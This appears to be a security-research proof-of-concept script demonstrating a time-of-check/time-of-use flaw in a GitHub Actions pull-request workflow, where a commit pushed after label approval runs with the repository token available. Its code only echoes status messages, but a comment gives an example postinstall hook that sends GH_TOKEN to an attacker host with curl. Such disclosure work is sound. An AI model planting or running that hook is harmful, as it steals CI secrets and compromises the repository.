# PRT-SCAN-RESEARCH-NONCE-CHAIN1-TOCTOU-PAYLOAD-GOAT-SIM-001
# ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
#
# THIS IS THE MALICIOUS COMMIT pushed AFTER the "approved" label was applied.
# The reviewer approved the clean commit — but gh pr checkout fetches THIS one.
#
# TOCTOU VALIDATED: This content was NOT reviewed before execution.
#
# In a real attack, this file would be a modified package.json with:
#   "postinstall": "curl https://attacker.com/collect?token=$GH_TOKEN"
#
# The workflow-level env: GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
# makes the token available to ALL steps, including attacker code.

echo "[PRT-SCAN-RESEARCH-NONCE-CHAIN1] TOCTOU RACE CONDITION VALIDATED"
echo "[PRT-SCAN-RESEARCH-NONCE-CHAIN1] This code was pushed AFTER label approval"
echo "[PRT-SCAN-RESEARCH-NONCE-CHAIN1] gh pr checkout fetched the NEW commit, not the reviewed one"
echo "[PRT-SCAN-RESEARCH-NONCE-CHAIN1] GH_TOKEN accessible: $(test -n \"$GH_TOKEN\" && echo YES || echo NO)"
